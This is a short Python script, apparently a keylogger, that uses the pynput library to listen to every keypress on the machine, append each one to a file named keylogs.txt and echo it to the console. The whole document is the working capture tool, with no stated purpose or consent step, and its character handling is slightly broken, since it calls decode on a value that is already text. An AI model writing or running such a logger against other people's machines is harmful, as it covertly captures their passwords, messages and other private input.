from pynput.keyboard import Listener

def on_press(key):
	try:
		log = f"{key.char.decode('utf-8') if hasattr(key, 'char') else str(key)}"
	except AttributeError:
		log = str(key)
	with open("keylogs.txt", "a") as f:
		f.write(log + "\n")
	print(log)

with Listener(on_press=on_press) as listener:
	listener.join()
